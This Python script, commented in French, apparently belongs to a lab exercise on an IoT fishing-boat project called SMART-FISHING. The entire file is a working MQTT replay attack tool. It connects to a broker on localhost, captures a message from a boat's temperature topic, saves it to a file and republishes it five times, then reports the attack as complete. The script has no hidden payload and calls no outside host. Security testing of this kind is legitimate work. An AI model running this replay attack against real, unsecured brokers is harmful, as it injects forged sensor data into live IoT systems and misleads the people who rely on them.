#!/usr/bin/env python3
"""
Script de Replay MQTT — SMART-FISHING
Capture un message légitime puis le rejoue plusieurs fois
"""

import paho.mqtt.client as mqtt
import json
import time
import sys

# Configuration
BROKER = "localhost"
PORT = 1883
TOPIC_CAPTURE = "fishing/boat/ABJ-001/temperature"  # Topic à capturer

# Fichier pour stocker le message capturé
CAPTURE_FILE = "/tmp/mqtt_replay_message.txt"

# Nombre de rejeux
REPLAY_COUNT = 5

# Mode : capture ou replay
MODE = sys.argv[1] if len(sys.argv) > 1 else "capture"

captured_message = None

def on_connect_capture(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connecté au broker pour capture ✅")
        print(f"[*] En attente d'un message sur {TOPIC_CAPTURE}...")
        client.subscribe(TOPIC_CAPTURE)
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_message_capture(client, userdata, msg):
    global captured_message
    captured_message = msg.payload.decode()
    print(f"[S] Message capturé ✅")
    print(f"[D] Topic: {msg.topic}")
    print(f"[D] Payload: {captured_message}")
    
    # Sauvegarder pour replay
    with open(CAPTURE_FILE, "w") as f:
        f.write(captured_message)
    
    print(f"[+] Message sauvegardé dans {CAPTURE_FILE}")
    client.disconnect()
    sys.exit(0)

def on_connect_replay(client, userdata, flags, rc):
    if rc == 0:
        print(f"[+] Connecté au broker pour replay ✅")
    else:
        print(f"[-] Échec de connexion, code: {rc}")

def on_publish_replay(client, userdata, mid):
    print(f"[+] Message {mid} rejoué ✅")

def mode_capture():
    """Capture un message MQTT"""
    client = mqtt.Client()
    client.on_connect = on_connect_capture
    client.on_message = on_message_capture
    client.connect(BROKER, PORT, 60)
    client.loop_forever()

def mode_replay():
    """Rejoue le message capturé"""
    try:
        with open(CAPTURE_FILE, "r") as f:
            message = f.read().strip()
        print(f"[*] Message à rejouer: {message}")
    except:
        print("[-] Aucun message capturé. Lancez d'abord le mode capture.")
        return
    
    client = mqtt.Client()
    client.on_connect = on_connect_replay
    client.on_publish = on_publish_replay
    client.connect(BROKER, PORT, 60)
    client.loop_start()
    time.sleep(1)
    
    print(f"\n[*] Rejeu de {REPLAY_COUNT} messages...")
    for i in range(REPLAY_COUNT):
        client.publish(TOPIC_CAPTURE, message)
        print(f"[{i+1}/{REPLAY_COUNT}] Message rejoué")
        time.sleep(1)
    
    client.loop_stop()
    client.disconnect()
    print("\n[+] Attaque de replay terminée ✅")

if __name__ == "__main__":
    if MODE == "capture":
        mode_capture()
    elif MODE == "replay":
        mode_replay()
    else:
        print("Usage: python3 replay.py [capture|replay]")
